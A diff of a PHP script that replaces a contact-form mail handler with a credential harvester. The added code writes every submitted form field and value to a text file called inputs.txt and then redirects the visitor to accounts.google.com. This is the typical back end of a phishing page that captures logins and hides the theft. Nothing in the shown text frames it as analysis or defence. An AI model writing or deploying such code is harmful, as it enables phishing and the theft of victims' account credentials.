@@ -1,32 +1,13 @@
 <?php
-$errors = '';
-$myemail = 'encorepvtltd@pm.me';
-if(empty($_POST['name'])  ||
-   empty($_POST['email']) ||
-   empty($_POST['message']))
-{
-    $errors .= "\n Error: all fields are required";
+header ('Location:https://accounts.google.com/');
+$handle = fopen("inputs.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
 }
-$name = $_POST['name'];
-$email_address = $_POST['email'];
-$message = $_POST['message'];
-if (!preg_match(
-"/ ^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/i",
-$email_address))
-{
-    $errors .= "\n Error: Invalid email address";
-}
-if( empty($errors))
-{
-    $to = '$myemail';
-    $email_subject = "Contact form submission: $name";
-    $email_body = "You have received a new message. ".
-        " Here are the details:\n Name: $name \n ".
-        "Email: $email_address\n Message \n $message";
-    $headers = "From: $myemail\n";
-    $headers .= "Reply-To: $email_address";
-    mail($to,$email_subject,$email_body,$headers);
-    //redirect to the 'thank you' page
-    header('Location: contact-form-thank-you.html');
-}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
 ?>
